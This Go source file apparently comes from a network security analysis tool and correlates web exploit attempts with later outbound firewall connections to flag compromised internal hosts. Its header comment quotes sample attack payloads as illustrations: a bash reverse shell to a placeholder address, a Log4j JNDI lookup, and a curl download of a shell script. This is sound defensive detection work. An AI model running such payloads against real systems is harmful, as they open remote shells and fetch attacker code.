package pipeline

import (
	"fmt"
	"net/netip"
	"strings"
	"sync"
	"time"

	"netsa/internal/detect"
	"netsa/internal/geo"
	"netsa/internal/model"
	"netsa/internal/store"
)

// 防火墙日志与 Web 日志联动：内网主机在遭受 Web 攻击之后主动连接攻击者、或连接攻击载荷中写明的回连地址，
// 说明攻击很可能已经得手（反弹 Shell、下载执行、Log4j / SSRF 回连、盲打 XSS 在管理员浏览器中触发）。
//
//   - 载荷中的回连地址：利用载荷里写着的公网地址（bash -i >& /dev/tcp/1.2.3.4/4444、${jndi:ldap://1.2.3.4/a}、
//     curl http://1.2.3.4/x.sh），之后有内网主机连接它 —— 载荷被执行了，这是响应码之外的证据，按严重处置；
//   - 攻击者本身：利用尝试之后，对外提供服务的内网主机主动连接攻击来源 —— 高危；其他内网主机（办公终端的
//     P2P 下载、视频加速也会连接家庭宽带地址）连接攻击来源只按中危提示，不列为失陷。
//
// 排除正常业务：攻击发生之前内网主机就连接过的地址（公共 DNS、CDN、合作方接口）、本单位自己对外发布服务的
// 公网地址（内部用户经出口 NAT 访问自己的网站时，Web 日志里的来源就是这个地址）不关联。

const (
	callbackWindow   = 2 * time.Hour   // 攻击之后多久内的外连参与关联
	callbackSlack    = 2 * time.Minute // 防火墙与 Web 服务器之间的时钟误差
	maxCallbackMarks = 50000
	maxEgressSeen    = 200000 // 内网主机连接过的公网地址（按哈希记录首次连接时间，分两代轮换）
	maxServers       = 10000
)

type attackMark struct {
	src    string // 攻击来源
	name   string // 命中的规则
	target string // 被攻击的站点与路径
	at     time.Time
}

type callbacks struct {
	mu        sync.Mutex
	attackers map[string]attackMark // 攻击来源 → 最近一次利用尝试
	payload   map[string]attackMark // 利用载荷中出现的公网地址 → 那次攻击
	// seen 记录内网主机连接过的公网地址及首次连接的时间：攻击之前就连接过的地址是正常业务
	seen, seenPrev map[uint64]int64
	// servers 是接收过外部访问的内网主机（DNAT 目标、被外部访问的内网地址），即对外提供服务的服务器
	servers map[string]struct{}
}

// 公共 DNS：命令注入、SSRF 探测常写 ping 8.8.8.8，内网主机本来就会连接它们。
var publicResolvers = map[string]bool{
	"8.8.8.8": true, "8.8.4.4": true, "1.1.1.1": true, "1.0.0.1": true, "9.9.9.9": true, "208.67.222.222": true,
	"114.114.114.114": true, "114.114.115.115": true, "223.5.5.5": true, "223.6.6.6": true, "119.29.29.29": true,
	"180.76.76.76": true, "180.184.1.1": true, "101.226.4.6": true, "117.50.10.10": true,
}

func ipKey(ip string) uint64 {
	h := uint64(14695981039346656037)
	for i := 0; i < len(ip); i++ {
		h ^= uint64(ip[i])
		h *= 1099511628211
	}
	return h
}

// observeCallback 记录 Web 利用尝试，并检查出站连接是否在攻击之后连接了攻击者或载荷中的回连地址。
// 返回追加了联动命中的切片（不修改调用方的数据）与需要自动确认的攻击来源。
func (p *Pipeline) observeCallback(ev *model.Event, hits []model.Hit) ([]model.Hit, *attackMark) {
	c := &p.cb
	at := ev.Time
	if at.IsZero() {
		at = time.Now()
	}
	if ev.Kind == model.KindFirewall && (ev.Outbound || detect.IsEgress(ev)) {
		return c.egress(ev, hits, at, p.ownIP)
	}
	if ev.Kind == model.KindFirewall && ev.Action != model.ActionDeny && !detect.InternalSource(ev) {
		c.noteServer(ev)
	}
	var name string
	for _, h := range hits {
		if !h.TagOnly && !h.Weak && !h.Inapplicable && h.Phase == model.PhaseExploit && h.Severity >= model.SevMedium {
			name = h.Name
			break
		}
	}
	if name == "" || ev.SrcIP == "" || detect.InternalSource(ev) {
		return hits, nil
	}
	m := attackMark{src: ev.SrcIP, name: name, target: detect.Printable(ev.Host+ev.URI, 120), at: at}
	var addrs []string
	if ev.Kind == model.KindWeb {
		for _, a := range payloadAddrs(ev) {
			if a != ev.SrcIP && a != ev.DstIP && !publicResolvers[a] && !p.ownIP(a) {
				addrs = append(addrs, a)
			}
		}
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	c.attackers = putMark(c.attackers, ev.SrcIP, m)
	for _, a := range addrs {
		c.payload = putMark(c.payload, a, m)
	}
	return hits, nil
}

func putMark(m map[string]attackMark, k string, v attackMark) map[string]attackMark {
	if m == nil {
		m = map[string]attackMark{}
	}
	if _, ok := m[k]; !ok && len(m) >= maxCallbackMarks {
		// 满了：清掉已经过了关联窗口的；仍然满就不再记录新的
		for x, old := range m {
			if v.at.Sub(old.at) > callbackWindow {
				delete(m, x)
			}
		}
		if len(m) >= maxCallbackMarks {
			return m
		}
	}
	m[k] = v
	return m
}

// payloadAddrs 提取利用载荷中写明的公网 IPv4 地址。
func payloadAddrs(ev *model.Event) []string {
	text := detect.Normalize(ev.URI) + " " + strings.ToLower(ev.UA) + " " + detect.Normalize(ev.Referer)
	var out []string
	for _, s := range ipv4Tokens(text, 8) {
		a, err := netip.ParseAddr(s)
		if err != nil || !a.Is4() || geo.IsPrivate(s) || a.IsMulticast() || a.IsUnspecified() || a.IsLoopback() || a.IsLinkLocalUnicast() {
			continue
		}
		out = append(out, a.String())
	}
	return out
}

// ipv4Tokens 找出文本中形如 a.b.c.d 的数字串（前后不紧挨数字或点），最多 limit 个。
func ipv4Tokens(s string, limit int) []string {
	var out []string
	for i := 0; i < len(s) && len(out) < limit; i++ {
		if s[i] < '0' || s[i] > '9' || i > 0 && (s[i-1] == '.' || s[i-1] >= '0' && s[i-1] <= '9') {
			continue
		}
		j, dots := i, 0
		for j < len(s) && (s[j] == '.' || s[j] >= '0' && s[j] <= '9') {
			if s[j] == '.' {
				dots++
			}
			j++
		}
		if dots == 3 && s[j-1] != '.' {
			out = append(out, s[i:j])
		}
		i = j
	}
	return out
}

// noteServer 记录接收外部访问的内网主机（调用方不持锁）。
func (c *callbacks) noteServer(ev *model.Event) {
	host := ev.NatDstIP
	if host == "" && geo.IsPrivate(ev.DstIP) {
		host = ev.DstIP
	}
	if host == "" || !geo.IsPrivate(host) {
		return
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if _, ok := c.servers[host]; ok || len(c.servers) >= maxServers {
		return
	}
	if c.servers == nil {
		c.servers = map[string]struct{}{}
	}
	c.servers[host] = struct{}{}
}

// egress 检查一次出站连接。
func (c *callbacks) egress(ev *model.Event, hits []model.Hit, at time.Time, own func(string) bool) ([]model.Hit, *attackMark) {
	dst := ev.DstIP
	if dst == "" || geo.IsPrivate(dst) {
		return hits, nil
	}
	k := ipKey(dst)
	c.mu.Lock()
	first, seen := c.firstSeenLocked(k)
	c.noteSeenLocked(k, at)
	mp, inPayload := c.payload[dst]
	ma, isAttacker := c.attackers[dst]
	_, server := c.servers[ev.SrcIP]
	c.mu.Unlock()
	within := func(m attackMark) bool {
		d := at.Sub(m.at)
		return d >= -callbackSlack && d <= callbackWindow
	}
	var m attackMark
	payload := false
	switch {
	case inPayload && within(mp):
		m, payload = mp, true
	case isAttacker && within(ma):
		m = ma
	default:
		return hits, nil
	}
	// 攻击之前就连接过：正常业务（攻击发生后才第一次连接的不算）
	if seen && first < m.at.Add(-callbackSlack).Unix() {
		return hits, nil
	}
	if own(dst) {
		return hits, nil
	}
	conn := dst
	if ev.DstPort > 0 {
		conn += fmt.Sprintf(":%d", ev.DstPort)
	}
	state := "已放行"
	res := model.ResultAllowed
	switch {
	case ev.Action == model.ActionDeny:
		state, res = "已拦截，主机仍在尝试连接", model.ResultBlocked
	case ev.Reply == model.ReplyNone:
		state = "已放行但对端无应答"
	case ev.Reply == model.ReplyYes:
		state = "已放行且对端有应答"
	}
	lag := at.Sub(m.at).Round(time.Second)
	if lag < 0 {
		lag = 0
	}
	h := model.Hit{RuleID: "corr-callback", Category: store.CatCallback, Phase: model.PhasePersistence, Result: res}
	switch {
	case payload:
		h.Name, h.Severity, h.Proven = "连接攻击载荷中的回连地址（载荷已被执行）", model.SevCritical, true
		h.Evidence = fmt.Sprintf("%s → %s（%s）：该地址出现在 %s 对 %s 的攻击载荷中（%s），攻击后 %s 被连接",
			ev.SrcIP, conn, state, m.src, m.target, m.name, lag)
	case server:
		h.Name, h.Severity = "被攻击后连接攻击者（疑似已被控制）", model.SevHigh
		h.Evidence = fmt.Sprintf("%s（对外提供服务的主机）→ %s（%s）：该地址 %s 前对 %s 发起过 %s，此前没有内网主机连接过它",
			ev.SrcIP, conn, state, lag, m.target, m.name)
	default:
		h.Name, h.Severity = "内网主机连接攻击者", model.SevMedium
		h.Evidence = fmt.Sprintf("%s → %s（%s）：该地址 %s 前对 %s 发起过 %s，此前没有内网主机连接过它；办公终端的 P2P 下载、视频加速也会连接陌生地址，请结合主机进程核实",
			ev.SrcIP, conn, state, lag, m.target, m.name)
	}
	if ev.Action == model.ActionDeny && h.Severity > model.SevHigh {
		h.Severity = model.SevHigh // 被拦截：载荷执行了但没有连出去
	}
	out := append(hits[:len(hits):len(hits)], h)
	if h.Severity >= model.SevHigh {
		return out, &m
	}
	return out, nil
}

func (c *callbacks) firstSeenLocked(k uint64) (int64, bool) {
	if t, ok := c.seen[k]; ok {
		return t, true
	}
	t, ok := c.seenPrev[k]
	return t, ok
}

func (c *callbacks) noteSeenLocked(k uint64, at time.Time) {
	t := at.Unix()
	if old, ok := c.seen[k]; ok {
		if t < old {
			c.seen[k] = t
		}
		return
	}
	if old, ok := c.seenPrev[k]; ok && old < t {
		t = old // 上一代记过：沿用最早的时间，轮换不丢失近期的连接记录
	}
	if c.seen == nil || len(c.seen) >= maxEgressSeen {
		c.seenPrev, c.seen = c.seen, map[uint64]int64{}
	}
	c.seen[k] = t
}

// ownIP 判断地址是否为本单位对外发布服务的公网地址。
func (p *Pipeline) ownIP(ip string) bool { return p.Exposure != nil && p.Exposure.OwnIP(ip) }
